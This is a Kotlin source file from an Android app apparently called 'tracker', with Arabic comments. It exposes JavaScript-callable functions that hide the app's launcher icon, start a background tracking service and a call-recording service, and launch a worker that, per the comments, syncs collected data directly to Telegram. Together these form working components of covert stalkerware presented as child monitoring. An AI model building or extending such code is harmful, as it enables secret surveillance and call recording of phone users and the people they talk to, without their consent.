package com.abuzahra.tracker

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.webkit.JavascriptInterface
import com.abuzahra.tracker.services.MainTrackerService
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker

/**
 * ChildWebInterface - واجهة الويب لربط JavaScript بـ Android
 * الإصدار الجديد: اتصال مباشر بتيليجرام بدون Firebase أو سيرفر وسيط
 */
class ChildWebInterface(private val mContext: Context) {

    @JavascriptInterface
    fun requestAllPermissions() {
        // هذه الدالة تُستدعى من زر "بدء التفعيل"
        // الأذونات يتم طلبها فعلياً من MainActivity عبر onResume chain
        Log.d("ChildApp", "requestAllPermissions called from JS")
    }

    @JavascriptInterface
    fun startServices() {
        startAllServices()
        Log.d("ChildApp", "بدء جميع الخدمات من WebView")
    }

    @JavascriptInterface
    fun hideApp() {
        Log.d("ChildApp", "إخفاء التطبيق")
        try {
            val pkg = mContext.packageManager
            val aliasName = ComponentName(mContext, mContext.packageName + ".LauncherAlias")

            pkg.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            sendResult("window.onAppHidden()")
            // إغلاق النشاط
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            mContext.startActivity(intent)
        } catch (e: Exception) {
            Log.e("ChildApp", "فشل الإخفاء", e)
            sendResult("window.onAppError('${e.message}')")
        }
    }

    /**
     * بدء جميع الخدمات مباشرة - بدون أي ربط Firebase
     */
    fun startAllServices() {
        try {
            // 1. حفظ معرف الجهاز محلياً (يُستخدم لاحقاً للتعرف على الجهاز)
            ensureDeviceId()

            // 2. خدمة التتبع الرئيسية
            val intent = Intent(mContext, MainTrackerService::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                mContext.startForegroundService(intent)
            } else {
                mContext.startService(intent)
            }

            // 3. خدمة تسجيل المكالمات
            val recIntent = Intent(mContext, CallRecorderService::class.java)
            recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                mContext.startForegroundService(recIntent)
            } else {
                mContext.startService(recIntent)
            }

            // 4. بدء مزامنة البيانات (الاتصال بتيليجرام)
            DataSyncWorker.startImmediate(mContext)

            Log.d("ChildApp", "تم بدء جميع الخدمات مباشرة")
        } catch (e: Exception) {
            Log.e("ChildApp", "خطأ في بدء الخدمات: ${e.message}", e)
        }
    }

    /**
     * التأكد من وجود معرف جهاز فريد
     */
    private fun ensureDeviceId() {
        val existingId = SharedPrefsManager.getDeviceId(mContext)
        if (existingId == null) {
            val androidId = Settings.Secure.getString(
                mContext.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: System.currentTimeMillis().toString()

            // حفظ معرف الجهاز محلياً
            val prefs = mContext.getSharedPreferences("child_prefs", Context.MODE_PRIVATE)
            prefs.edit().apply {
                putString("device_id", androidId)
                putString("parent_uid", "direct_telegram")
                apply()
            }
            Log.d("ChildApp", "تم إنشاء معرف جهاز: $androidId")
        }
    }

    private fun sendResult(js: String) {
        try {
            val activity = mContext
            if (activity is MainActivity) {
                activity.runOnUiThread {
                    activity.webView.evaluateJavascript(js, null)
                }
            }
        } catch (e: Exception) {
            Log.e("ChildApp", "خطأ في sendResult: ${e.message}")
        }
    }
}
